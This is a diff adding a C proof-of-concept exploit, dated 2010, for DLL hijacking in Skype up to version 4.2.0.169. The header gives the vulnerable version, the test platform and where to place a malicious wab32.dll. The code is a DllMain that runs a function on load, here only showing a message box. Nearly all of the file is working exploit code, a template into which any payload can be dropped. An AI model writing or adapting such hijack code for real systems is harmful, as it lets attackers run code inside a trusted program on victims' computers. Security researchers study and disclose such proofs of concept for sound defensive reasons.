@@ -1,0 +1,31 @@
+/* 
+Exploit Title: Skype <= 4.2.0.169 DLL Hijacking Exploit (wab32.dll)
+Date: August 25, 2010
+Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
+Version: Latest Skype v4.2.0.169
+Tested on: Windows 7 x64 Ultimate
+Vulnerable extensions: .skype
+Greetz: Astalavista, OffSEC, Exploit-DB
+Notes: Create folders %commonprogramfiles%\system and place wab32.dll
+       %commonprogramfiles(x86)% on x64 bit
+*/
+
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+
+BOOL WINAPI  DllMain (
+            HANDLE    hinstDLL,
+            DWORD     fdwReason,
+            LPVOID    lpvReserved)
+{
+  dll_hijack();
+  return 0;
+}
+
+int dll_hijack()
+{
+  MessageBox(0, "Skype DLL Hijacking!", "DLL Message", MB_OK);
+  return 0;
+}
+
